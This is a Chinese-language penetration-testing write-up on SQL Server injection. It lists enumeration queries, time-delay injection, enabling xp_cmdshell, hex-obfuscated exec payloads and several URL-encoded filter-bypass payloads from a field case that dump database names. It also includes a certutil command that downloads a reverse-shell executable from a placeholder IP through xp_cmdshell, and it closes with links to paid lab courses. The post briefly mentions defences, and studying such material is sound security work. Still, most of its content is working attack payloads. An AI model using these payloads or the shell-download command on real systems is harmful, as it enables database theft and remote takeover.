原创： K4ng  合天智汇

  

在实习的渗透测试项目中，遇到的数据库系统绝大部分是SQL Server。也算是了解和熟悉Mssql 的一个重要过程吧。

  
  

获取某数据库的所有表（假设库名为fooDB）

\--XType='U':表示所有用户表;

\--XType='S':表示所有系统表;

SELECTname FROM fooDB..sysobjects Where xtype='U';

获取某表所有字段名（假设表名为fooTable）

SELECTname FROM SysColumns WHERE id=Object_id('fooTable');

延时注入

SELECT* FROM fooTable WHERE id=1 WAITFOR DELAY '0:0:3';

2、常用内置函数

db_name()-- 当前库名  

user-- 当前用户名

suser_name()-- 登陆用户名

3、like查询大小写敏感模式

SELECT* FROM dt WHERE columnname COLLATE Chinese_PRC_CS_AS LIKE 'aa%';

举例分析Chinese_PRC_CS_AI_WS：

前半部份：指 UNICODE字符集，Chinese_PRC_指针对大陆简体字UNICODE 的排序规则。

_BIN 二进制排序

_CI(CS) 是否区分大小写，CI不区分，CS区分

_AI(AS) 是否区分重音，AI不区分，AS区分

_KI(KS) 是否区分假名类型，KI不区分，KS区分

_WI(WS) 是否区分宽度，WI不区分，WS区分

4、实现limitm,n

查询结果中第7 条到第 9条记录，如 MySql中的 limit 7,3

selecttop 3 id from tablename

whereid not in (

selecttop 6 id from tablename

)

  
  

开启xp_cmdshell存储过程  

EXECsp_configure 'show advanced options', 1;

RECONFIGURE;

EXECsp_configure 'xp_cmdshell', 1;

RECONFIGURE;

关闭只需将开启语句的第二个1改成0再执行即可

运行命令

execmaster..xp_cmdshell "whoami";

execmaster..xp_cmdshell "ping 127.0.0.1 -n 5 > nul";

execmaster..xp_cmdshell "certutil -urlcache -split -fhttp://IP/re_shell.exe
D:\re_shell.exe";

彻底防御xp_cmdshell方法：修复sql注入漏洞、删除xplog70.dll 组件

  

and可用：?key=aa'+and+db_name()>1

and不可用：?key='%2buser()^1

convert转换类型：?key=a'%2b(convert(int,@@version))

  
  

; dEcLaRe @s vArChAr(8000) sEt

@s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29eXeC(@s)-- -
2、有趣的绕过例子输入单引号时会报错

![微信图片_1.jpg](https://image.3001.net/images/20180903/1535941734_5b8c9c6645d89.jpg!small)  
  

尝试%23和--+-的注释来判断后端数据库系统类型。语句出错的时候返回200并报错。正确的时候是302。可知为mssql。

服务端对数据进行了拦截和过滤，拒绝处理请求。然而可利用varchar^int 来爆出数据。

?appSysCode='%2buser%5e1--+-
![微信图片_2.jpg](https://image.3001.net/images/20180903/1535941756_5b8c9c7c2ddc9.jpg!small)  

  
  

拦截有点厉害。尝试了许多select方式都不行。

?appSysCode=a'%2b(select+'aaa')--+-
?appSysCode=a'%2b(select+1)%5e1--+-
?appSysCode=a'%2b(convert(int,(select+'bbb')))%5e1--+-（这里只有a报错）

?appSysCode=a'%2b(convert(varchar,(select+'bbb')))%5e1--+-（这里直接302）

?appSysCode=a'%2b(convert(int,(select+'bbb')))--+-
?appSysCode=a'%3bSELECT+11--+-
?appSysCode=a'%3bexec+xxxxx--+-
不过还是存在规则缺陷的。

?appSysCode=a'%3bselect+*+from+(select+'aaa'+as+c)+t2+where+c%5e1=0--+-
  
![微信图片_20180903103045.jpg](https://image.3001.net/images/20180903/1535941871_5b8c9cefe0fbb.jpg!small)  

可爆出任意数据

?appSysCode=a'%3bSELECT+name+FROM+master..sysdatabases+where+name%5e1%3e0+and+name+NOT+IN+('master','model','msdb','tempdb','northwind','pubs')--+-
  

  

实验课程推荐时间（via合天网安实验室）

1、SQL语句简介

http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017041909191700001

2、SQL注入初级

http://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182014081415242400001

3、SQL注入进阶

http://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182014090911000400001

  

 **（如需转载，请注明出处）  
**

